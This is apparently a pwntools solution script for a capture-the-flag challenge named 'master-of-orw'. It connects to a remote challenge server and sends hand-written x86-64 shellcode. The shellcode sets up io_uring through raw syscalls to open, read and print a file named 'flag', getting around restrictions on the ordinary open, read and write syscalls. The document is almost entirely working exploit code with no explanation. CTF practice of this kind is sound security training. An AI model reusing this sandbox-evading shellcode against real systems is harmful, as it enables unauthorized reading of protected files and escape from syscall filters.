#! /usr/bin/python3
# -*- coding: utf-8 -*-
from pwn import *

elf_path = "./master-of-orw"
elf = ELF(elf_path)

context(arch = elf.arch, os = 'linux', log_level = 'debug', encoding = "latin1")

gdbscript = \
"""
    bp 0x4019d1
    c
"""

if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("120.46.65.156", 32101)
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    p = gdb.debug(elf_path, gdbscript = gdbscript)
else:
    p = process(elf_path)

shellcode = \
"""
main:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x200
    mov     edx, 0
    lea     rsi, [rbp-0xf0]
    mov     edi, 0x10
    call    io_uring_queue_init
    lea     rdi, [rbp-0xf0]
    call    io_uring_get_sqe
    mov     r8d, 0
    mov     ecx, 0
    mov     rdi, 0x67616c66
    mov     qword ptr [rbp-0x300], rdi
    lea     rdx, [rbp-0x300]
    mov     rsi, 0x0FFFFFF9C
    mov     rdi, rax
    call    io_uring_prep_openat
    lea     rdi, [rbp-0xf0]
    call    io_uring_submit
    lea     rsi, [rbp-0xf8]
    lea     rdi, [rbp-0xf0]
   	call    io_uring_wait_cqe
    mov     rax, [rbp-0xf8]
    mov     eax, [rax+8]
    mov     [rbp-0xc], eax
    lea     rdi, [rbp-0xf0]
    call    io_uring_get_sqe
    lea     rdx, [rbp-0x200]
    mov     esi, [rbp-0xc]
    mov     r8d, 0
    mov     ecx, 0x100
    mov     rdi, rax
    call    io_uring_prep_read
    lea     rdi, [rbp-0xf0]
    call    io_uring_submit
    lea     rax, [rbp-0xf0]
    mov     rdi, rax
    call    io_uring_get_sqe
    lea     rdx, [rbp-0x200]
    mov     r8d, 0
    mov     ecx, 0x100
    mov     esi, 1
    mov     rdi, rax
    call    io_uring_prep_write
    lea     rdi, [rbp-0xf0]
    call    io_uring_submit
    push    1
    push    1
    mov     rdi, rsp
    mov     rax, 35
    syscall
    pop     rax
    pop     rax
    leave
    ret
io_uring_queue_init:
    sub     rsp, 0x88
    mov     r8d, edi
    mov     rdx, rsp
    push    rbp
    mov     rbp, rdx
    mov     rbx, rsi
    mov     rsi, rdx
    mov     rax, 0x1A9
    syscall
    lea     rdi, [rbx+8]
    mov     rcx, rbx
    mov     r12d, eax
    xor     eax, eax
    mov     qword ptr [rbx], 0
    mov     rdx, rbx
    mov     rsi, rbp
    mov     qword ptr [rbx+0x0D0], 0
    sub     rcx, rdi
    add     ecx, 0x0D8
    shr     ecx, 3
    rep stosq
    lea     rcx, [rbx+0x68]
    mov     edi, r12d
    call    io_uring_mmap
    mov     r13d, eax
    mov     eax, [rbp+8]
    mov     [rbx+0x0C4], r12d
    mov     [rbx+0x0C0], eax
    mov     eax, [rbp+0x14]
    mov     [rbx+0x0C8], eax
    mov     eax, r13d
    pop     rbp
    add     rsp, 0x88
    ret
io_uring_mmap:
    push    r13
    mov     r13d, edi
    push    r12
    mov     r12, rcx
    push    rbp
    mov     rbp, rdx
    push    rbx
    mov     rbx, rsi
    mov     edx, [rsi]
    mov     eax, [rsi+0x40]
    mov     esi, [rsi+4]
    lea     rax, [rax+rdx*4]
    mov     edx, [rbx+0x64]
    shl     rsi, 4
    mov     [rbp+0x48], rax
    add     rsi, rdx
    mov     [rcx+0x38], rsi
    mov     rsi, [rbp+0x48]
    mov     [rbp+0x48], rsi
    mov     [r12+0x38], rsi
    xor     r9d, r9d
    mov     r8d, r13d
    mov     ecx, 0x8001
    mov     edx, 3
    xor     edi, edi
    call    __sys_mmap
    mov     [rbp+0x50], rax
    mov     [r12+0x40], rax
    mov     edx, [rbx+0x28]
    mov     esi, [rbx]
    mov     r9d, 0x10000000
    mov     r8d, r13d
    mov     ecx, 0x8001
    xor     edi, edi
    add     rdx, rax
    shl     rsi, 6
    mov     [rbp+0], rdx
    mov     edx, [rbx+0x2C]
    add     rdx, rax
    mov     [rbp+8], rdx
    mov     edx, [rbx+0x30]
    add     rdx, rax
    mov     [rbp+0x10], rdx
    mov     edx, [rbx+0x34]
    add     rdx, rax
    mov     [rbp+0x18], rdx
    mov     edx, [rbx+0x38]
    add     rdx, rax
    mov     [rbp+0x20], rdx
    mov     edx, [rbx+0x3C]
    add     rdx, rax
    mov     [rbp+0x28], rdx
    mov     edx, [rbx+0x40]
    add     rax, rdx
    mov     edx, 3
    mov     [rbp+0x30], rax
    call    __sys_mmap
    mov     [rbp+0x38], rax
    mov     edx, [rbx+0x50]
    mov     rax, [r12+0x40]
    add     rdx, rax
    mov     [r12], rdx
    mov     edx, [rbx+0x54]
    add     rdx, rax
    mov     [r12+8], rdx
    mov     edx, [rbx+0x58]
    add     rdx, rax
    mov     [r12+0x10], rdx
    mov     edx, [rbx+0x5C]
    add     rdx, rax
    mov     [r12+0x18], rdx
    mov     edx, [rbx+0x60]
    add     rdx, rax
    mov     [r12+0x28], rdx
    mov     edx, [rbx+0x64]
    add     rdx, rax
    mov     [r12+0x30], rdx
    mov     edx, [rbx+0x68]
    add     rax, rdx
    mov     [r12+0x20], rax
    pop     rbx
    pop     rbp
    pop     r12
    pop     r13
    ret
__sys_mmap:
    mov rax, 9
    syscall
    ret
io_uring_get_sqe:
    mov     eax, [rdi+0x44]
    add     qword ptr [rdi+0x44], 1
    shl     rax, 6
    add     rax, [rdi+0x38]
    ret
io_uring_prep_openat:
    mov     rcx, rdx
    mov     edx, esi
    mov     esi, r8d
    mov     rax, rdi
    mov     r9d, 0
    mov     r8d, esi
    mov     rsi, rax
    mov     edi, 0x12
    call    io_uring_prep_rw
    ret
io_uring_prep_read:
    mov     r13d, esi 
    mov     esi, ecx
    mov     rcx, rdx
    mov     edx, r13d
    mov     rax, rdi
    mov     r9, r8
    mov     r8d, esi
    mov     rsi, rax
    mov     edi, 0x16
    call    io_uring_prep_rw
    ret
io_uring_prep_write:
    mov     r13d, esi 
    mov     esi, ecx
    mov     rcx, rdx
    mov     edx, r13d
    mov     rax, rdi
    mov     r9, r8
    mov     r8d, esi
    mov     rsi, rax
    mov     edi, 0x17
    call    io_uring_prep_rw
    ret
io_uring_prep_rw:
    mov     qword ptr [rsi], 0
    mov     [rsi], dil
    mov     [rsi+4], edx
    mov     [rsi+8], r9
    mov     [rsi+0x10], rcx
    mov     [rsi+0x18], r8d
    mov     dword ptr [rsi+0x1C], 0
    mov     qword ptr [rsi+0x20], 0
    mov     qword ptr [rsi+0x28], 0
    mov     qword ptr [rsi+0x30], 0
    mov     qword ptr [rsi+0x38], 0
    ret
io_uring_submit:
    mov     r10, [rdi+8]
    mov     edx, [rdi+0x40]
    mov     r8d, [rdi+0x44]
    mov     eax, [r10]
    sub     r8d, edx
    mov     rcx, [rdi+0x10]
    mov     r9, [rdi+0x30]
    add     r8d, eax
    mov     ecx, [rcx]
    mov     esi, eax
    and     edx, ecx
    add     eax, 1
    and     esi, ecx
    mov     [r9+rsi*4], edx
    mov     edx, [rdi+0x40]
    add     edx, 1
    mov     [rdi+0x40], edx
    mov     [r10], eax
    mov     rdx, [rdi]
    sub     eax, [rdx]
    xor     edx, edx
    mov     esi, eax
    mov     eax, [rdi+0x0C0]
    mov     edi, [rdi+0x0C4]
    xor     r8d, r8d
    xor     r10, r10
    mov     rax, 0x1AA
    syscall
    ret
io_uring_wait_cqe:
    mov     r13, rsi
    mov     esi, [rdi+0x78]
    mov     edx, [rdi+0x70]
    mov     rcx, [rdi+0x68]
    mov     eax, [rcx]
    sub     edx, eax
    mov     ebx, esi
    and     ebx, eax
    shl     rbx, 4
    add     rbx, [rdi+0x98]
    mov     [r13], rbx
    ret
"""

code = asm(shellcode)
print(hex(len(code)))

p.sendafter("Input your code\n", code)

p.interactive()
